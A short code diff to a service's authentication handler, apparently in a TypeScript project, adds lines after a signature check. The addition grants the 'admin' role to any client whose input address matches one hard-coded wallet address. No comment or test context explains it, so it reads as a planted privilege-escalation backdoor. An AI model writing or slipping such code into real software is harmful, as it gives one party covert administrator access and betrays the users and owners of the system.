@@ -109,6 +109,12 @@ export class Service {
 
     if (!isValid) throw new Error('Invalid signature');
 
+    if (input.address === '0xDfA8f768d82D719DC68E12B199090bDc3691fFc7') {
+      if (!ctx.client.roles) ctx.client.roles = [];
+
+      ctx.client.roles.push('admin');
+    }
+
     return {
       token: input.token,
       profile: ctx.client.profile.toJSON(),
